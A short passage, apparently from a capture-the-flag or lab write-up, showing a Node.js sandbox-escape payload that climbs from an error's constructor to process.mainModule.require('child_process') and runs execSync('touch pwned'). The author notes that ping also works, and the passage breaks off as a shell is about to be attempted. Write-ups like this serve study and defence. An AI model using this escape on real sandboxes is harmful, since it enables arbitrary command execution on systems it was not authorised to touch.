@@ -1,0 +1,1 @@
+=> x , ( err ) => { return err . constructor . constructor ( ' return process ' )(). mainModule . require ( ' child_process ' ). execSync ( ' touch pwned ' ); } ) } } }; p . then (); It is the same as the previous one, though it returns [object Object] . Changing it to ping works here as well. Shell I’ll
